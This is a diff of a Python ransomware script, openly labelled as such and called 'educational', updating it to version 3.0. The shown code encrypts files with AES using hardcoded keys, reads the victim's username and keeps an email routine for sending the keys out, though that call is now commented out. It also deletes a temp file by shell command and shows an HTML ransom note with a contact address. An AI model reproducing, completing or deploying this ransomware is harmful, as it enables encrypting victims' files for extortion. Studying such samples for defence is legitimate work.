@@ -1,19 +1,21 @@
 #!/usr/bin/env python
-'''
-This program is a Ransomware, it was created with educational goals
-so take carefull to use it.
-
-Change the email account with your account.
-
-mateus-N00B, Agosto 2016
-
-Version 1.0
-
-License GPL
-
-TODO:
-Insert a random key generation.
-'''
+#!/usr/bin/env python
+# A ransomware written in python for educational purposes.
+# By Mateus-n00b
+# TIP: Before remove the ransomware from system run this cmd, shred <file.py>.
+#        _______  _______ ___.
+#   ____ \   _  \ \   _  \\_ |__
+#  /    \/  /_\  \/  /_\  \| __ \
+# |   |  \  \_/   \  \_/   \ \_\ \
+# |___|  /\_____  /\_____  /___  /
+#      \/       \/       \/    \/
+#
+#
+# Version 3.0
+# 13/01/2017
+#
+# License GPLv2
+#
 
 import os,sys,time
 import smtplib
@@ -21,36 +23,35 @@ import random
 import hashlib, getpass
 
 # Looking for the pycrypto
-
 try:
 	from Crypto.Cipher import AES
 except:
-	  os.system('pip install pycrypto')
-	  time.sleep(1)
-	  from Crypto.Cipher import AES
+	#   os.system('pip install pycrypto')
+	print "[-] Install the pycrypto!"
+	sys.exit(0)
 
 from Crypto.Random import random
 
-'''+++++++++++++++++++++++++ GLOBALS DEFINE +++++++++++++++++++++++++'''
-global PASSWORD
-global IV
-global USER
+'''+++++++++++++++++++++++++ VARS +++++++++++++++++++++++++'''
+PASSWORD 		= 				""
+IV				=				""
+USER			=				""
+FILES = []
+KEYS = ['68b329da9893e340', '4e5dc3caa06fa07c',
+'ba0cc7fbd788f3aa', '6fad925d11791093','93c2f537558d98f8', '7755cd776caa84bc', '41e4d89b2ae8a90f']
 
-KEYS = ['68b329da9893e340', '4e5dc3caa06fa07c','ba0cc7fbd788f3aa', '6fad925d11791093','93c2f537558d98f8', '7755cd776caa84bc', '41e4d89b2ae8a90f']
+'''+++++++++++++++++++++++++ INITIALIZING VARS +++++++++++++++++++++++++'''
 
-# Loading the keys
 seed = str(random.randint(0,35535))
 HASH = hashlib.md5(seed)
-IV = str(random.choice(KEYS))
+IV = random.choice(KEYS)
+
 seed = str(random.randint(0,35535))
 HASH = hashlib.md5(seed)
 PASSWORD = str(random.choice(KEYS))
-
-# Array to get the crypted files
-FILES = []
-
-# Get the victim name
 USER = os.getenv('USER')
+
+print "IV=> %s\nPASSWORD=> %s" % (IV,PASSWORD)
 
 '''+++++++++++++++++++++++++ EMAIL FUNCTION +++++++++++++++++++++++++'''
 def email_function():
@@ -67,13 +68,13 @@ def email_function():
 	except:
 		pass
 
-# Encrypt function
+'''+++++++++++++++++++++++++ ENCRYPT FUNCTION +++++++++++++++++++++++++'''
 def encrypt():
 	os.system('clear||cls')
 	print "[!] This should take a long time..."
 
 	bar = AES.new(PASSWORD, AES.MODE_CBC,str(IV))
-	
+
 	# Getting the files to encrypt
 	os.chdir('.')
 	os.system('[ -f /tmp/h4ck3d.txt ] && rm /tmp/h4ck3d.txt')
@@ -107,11 +108,11 @@ def encrypt():
 			#print "[-] Error to encrypt %s" % x
 			pass
 
-	email_function()
+	# email_function()
 	time.sleep(2)
 	notification()
 
-# The html notification page
+'''+++++++++++++++++++++++++ NOTIFICATION FUNCTION +++++++++++++++++++++++++'''
 def notification():
 	msg = " <!DOCTYPE html>\
 	<html>\
@@ -120,7 +121,7 @@ def notification():
 	</head>\
 	<body>\
 	\
-	<p>Oops! We've got a little problem here! It seems that we have a ransomware. </p>\
+	<p>Oops! We've got a little problem here! It's seems that we have a ransomware. </p>\
 	<p>Talk to: foobarnoobr@gmail.com</p>\
 	\
 	</body>\
